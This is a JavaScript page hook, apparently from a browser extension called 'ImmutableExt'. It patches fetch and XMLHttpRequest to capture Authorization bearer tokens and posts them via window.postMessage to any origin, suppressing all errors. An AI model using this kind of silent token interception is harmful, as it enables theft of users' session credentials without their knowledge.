(() => {
    try {
        const sendToken = (token) => {
            try {
                if (!token || typeof token !== 'string') return;
                const lower = token.toLowerCase();
                const bearer = lower.startsWith('bearer ') ? token.slice(7).trim() : token.trim();
                if (!bearer) return;
                window.postMessage({ __immutableExt: true, type: 'TOKEN_CAPTURED', token: bearer }, '*');
            } catch (_) { }
        };

        // Hook fetch
        try {
            const originalFetch = window.fetch;
            if (typeof originalFetch === 'function') {
                window.fetch = function patchedFetch(input, init) {
                    try {
                        const headers = (init && init.headers) || (input && input.headers);
                        if (headers) {
                            if (headers instanceof Headers) {
                                const auth = headers.get('authorization') || headers.get('Authorization');
                                if (auth) sendToken(auth);
                            } else if (Array.isArray(headers)) {
                                for (const pair of headers) {
                                    if (!pair) continue;
                                    const k = String(pair[0]);
                                    const v = String(pair[1]);
                                    if (k.toLowerCase() === 'authorization') { sendToken(v); break; }
                                }
                            } else if (typeof headers === 'object') {
                                for (const k in headers) {
                                    if (Object.prototype.hasOwnProperty.call(headers, k) && String(k).toLowerCase() === 'authorization') {
                                        sendToken(String(headers[k]));
                                        break;
                                    }
                                }
                            }
                        }
                    } catch (_) { }
                    return originalFetch.apply(this, arguments);
                };
                try { Object.defineProperty(window.fetch, 'name', { value: 'immutable_patched_fetch' }); } catch (_) { }
            }
        } catch (_) { }

        // Hook XHR
        try {
            const originalOpen = XMLHttpRequest.prototype.open;
            const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
            XMLHttpRequest.prototype.open = function patchedOpen() {
                this.__immutableAuth = this.__immutableAuth || null;
                return originalOpen.apply(this, arguments);
            };
            XMLHttpRequest.prototype.setRequestHeader = function patchedSetRequestHeader(name, value) {
                try {
                    if (String(name).toLowerCase() === 'authorization') {
                        this.__immutableAuth = String(value);
                        sendToken(this.__immutableAuth);
                    }
                } catch (_) { }
                return originalSetRequestHeader.apply(this, arguments);
            };
        } catch (_) { }

        try { console.debug('[ImmutableExt] pageHook installed'); } catch (_) { }
    } catch (_) { }
})();



